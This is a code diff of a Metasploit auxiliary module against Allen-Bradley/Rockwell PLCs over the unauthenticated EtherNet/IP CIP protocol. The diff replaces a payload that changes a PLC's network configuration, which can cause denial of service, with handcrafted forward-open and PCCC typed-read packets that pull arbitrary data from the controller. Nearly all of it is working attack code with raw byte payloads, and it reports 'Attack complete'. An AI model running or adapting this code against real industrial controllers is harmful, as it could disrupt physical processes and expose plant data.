@@ -15,8 +15,8 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Allen-Bradley/Rockwell Automation EtherNet/IP CIP Change IP Configuration',
       'Description'    => %q{
-        The EtnerNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which
-        implements the protocol.  This module implements changing the Ethernet settings, potentially
+        The EtherNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which
+        implements the protocol.  This module reads and writes arbitrary data, potentially
         resulting in a DOS condition
 
         This module is based on the original 'ethernetip-multi.rb' Basecamp module
@@ -40,14 +40,6 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(44818),
-        OptString.new("NEWIP", [true, "New Target IP","192.168.0.50"]),
-        OptString.new("NETMASK",[true,"New network mask","255.255.255.0"]),
-        OptString.new("GATEWAY",[true,"New Gateway","192.168.0.1"]),
-        OptString.new("NEWDNS1",[true,"New DNS 1","0.0.0.0"]),
-        OptString.new("NEWDNS2",[true,"New DNS 2","0.0.0.0"]),
-        OptString.new("DOMAIN",[true,"New Domain","p0wned"]),
-
-
         #How the bloody hell do I validate these in metasploit...
         
       ], self.class
@@ -55,22 +47,33 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status "#{rhost}:#{rport} - CIP - Modifying IP Configuration"
-    payload()
+    print_status "#{rhost}:#{rport} - CIP - Reading Data"
     sid = req_session
 
     if sid
-      forge_packet(sid, payload())
-      print_status "#{rhost}:#{rport} - CIP - attack complete."
+      #FWD_OPEN
+      print_status "#{rhost}:#{rport} - CIP - Sending FWD_OPEN Request"
+      forge_packet(sid, payload(0),"\x6f\x00")
+      data = sock.get_once(1024)
+      print_status "Got response"
+      #Data Table Read
+      forge_packet(sid, payload(1),"\x70\x00")
+      data = sock.get_once(1024)
+      print_status "Got Response"
+      print_status "#{rhost}:#{rport} - CIP - Sending Data Read"
+      print_status "#{rhost}:#{rport} - CIP - Attack complete."
     end
   end
 
-  def forge_packet(sessionid, payload)
-    packet = ""
-    packet += "\x6f\x00" # command: Send request/reply data
-    packet += [payload.size - 0x10].pack("v") # encap length (2 bytes)
-    packet += [sessionid].pack("N") # session identifier (4 bytes)
-    packet += payload #payload part
+  def forge_packet(sessionid, payload, command)
+    packet = command # command: Send request/reply data
+    packet << [payload.size].pack("v") # encap length (2 bytes)
+    packet << [sessionid].pack("N") # session identifier (4 bytes)
+    packet << "\x00\x00\x00\x00" #Status: Success (We don't really want failures...)
+    packet << "\x00\x00\x00\x01\x00\x18\x1d\xce" #Sender Context
+    packet << "\x00\x00\x00\x00" #Options
+    packet << payload # Payload
+
     begin
       sock.put(packet)
     rescue ::Interrupt
@@ -132,30 +135,51 @@ class Metasploit3 < Msf::Auxiliary
     return ip
   end
 
-  def payload()
+  def payload(stage)
+    case stage
+      when 0
+        #This is a forward open request.
+        payload = "\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x30\x00"
+        payload << "\x54\x02" #Forward open request
+        payload << "\x20\x06\x24\x01" #No idea what this is 
+        payload << "\x07\xe8" #Timeout
+        payload << "\x00\x00\x04\x80" # O>T Connection ID
+        payload << "\x80\x68\x00\x17" # T>O Connection ID
+        payload << "\x07\x22" #Connection Serial Number
+        payload << "\x01\x00" # Vendor ID (Rockwell automation/ Allen Bradley)
+        payload << "\xf2\x0c\x02\x00" # Originator Serial Number
+        payload << "\x00\x00\x00\x00" # Reserved
+        payload << "\xe0\x70\x72\x00" #O>T RPI
+        payload << "\xf6\x43" #O>T Connection parameters
+        payload << "\xe0\x70\x72\x00" #T>O RPI
+        payload << "\xf6\x43" #T>O Connection Parameters
+        payload << "\xa3" #Transport Type
+        payload << "\x03" #Connection path size (3 words)
+        payload << "\x01\x01\x20\x02\x24\x01" #Connection Path  Port:1 Address 1: Message Router, Instance: 0x01
+      when 1
+        # This is the Data read request.
+        payload = "\x00\x00\x00\x00\x00\x00"
+        payload << "\x02\x00" # Generic Data
+        payload << "\xa1\x00\x04\x00" # CID To follow
+        #payload << "\x80\x60\x00\x7a" # CID
+        payload << "\x80\x68\x00\x17" # T>O Connection ID
+        payload << "\xb1\x00" # Connected Data Item 
+        payload << "\x1e\x00" 
+        payload << "\x01\x00" # Sequence count
+        payload << "\x4b" # Execute_PCCC
+        payload << "\x02\x20\x67\x24\x01"
+        payload << "\x07\x01\x00\x42\x00\x1c\xbc"
+        payload << "\x0f\x00\xdd\x36\x68" # Typed Read
+        payload << "\x00\x00\x08\x00"
+        payload << "\x07\x00\x07\x00" # PLC5 Address
+        payload << "\x08\x00"
+        #payload << "\x02\x00\xa1\x00\x04\x00\x80\x67\x00\x47\xb1\x00"
+        #payload << "\x14\x00\x01\x00\x4c\x07\x91\x0b\x72\x65\x61\x64\x5f\x76\x61\x6c\x75\x65\x73\x00\x01\x00"
+      else
+        print_status("Something's gone wrong")
+        payload = "FAILFAILFAIL"
+    end
 
-=begin
-    #Byte Convert ip addresses to hex
-    ip = byte_encode('NEWIP')
-    netmask = byte_encode('NETMASK')
-    gateway = byte_encode('GATEWAY')
-    dns1 = byte_encode("NEWDNS1")
-    dns2 = byte_encode("NEWDNS2")
-    domain = "\x06\x00" + datastore['DOMAIN'] #Doesn't need converting?
-    payload = "\x00\x00\x00\x00\x00\x04\x02\x00\x00\x00\x00\x00\xb2\x00\x24\x00" + #encapsulation -[payload.size-0x10]
-    "\x10\x03\x20\xf5\x24\x01\x30\x05" 
-    payload << ip
-    payload << netmask
-    payload << gateway
-    payload << dns1
-    payload << dns2
-    payload << domain
-=end
-    payload = "\x00\x00\x00\x00\xc0\xa8\x00\x5c\x00\x0e\x32\x81\x00\x00\x00\x00\x00"
-    payload << "\x00\x00\x00\x00\x04\x02\x00\x00\x00\x00\x00\xb2\x00\x2e\x00"
-    payload << "\x54\x02\x20\x06\x24\x01\x0a\x0e\xea\x74\x94\x82\x7c\x74\x94\x82"
-    payload << "\x01\x81\x01\x00\x2c\x6e\x00\x74\x02\x00\x00\x00\xc0\xc6\x2d\x00\x02"
-    payload << "\x43\xc0\xc6\x2d\x00\x02\x43\xa3\x02\x20\x02\x24\x01"
     return payload
   end
 
